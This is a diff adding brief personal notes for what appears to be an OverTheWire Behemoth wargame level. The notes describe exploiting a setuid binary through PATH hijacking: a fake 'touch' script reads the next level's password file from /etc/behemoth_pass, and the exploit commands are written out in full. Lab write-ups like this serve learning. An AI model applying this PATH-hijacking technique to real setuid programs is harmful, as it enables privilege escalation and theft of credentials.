@@ -1,0 +1,12 @@
+Create an fake ‘touch’
+
+echo "cat /etc/behemoth_pass/behemoth3" > touch
+
+PATH=/tmp/tmp112:$PATH /behemoth/behemoth2
+chmod 777 touch
+so when system("touch 23751") is run
+then cat is called.
+
+also if echo "echo" > touch
+this doesnt echo the current pid in the program, same as ./touch hello
+would return no hello
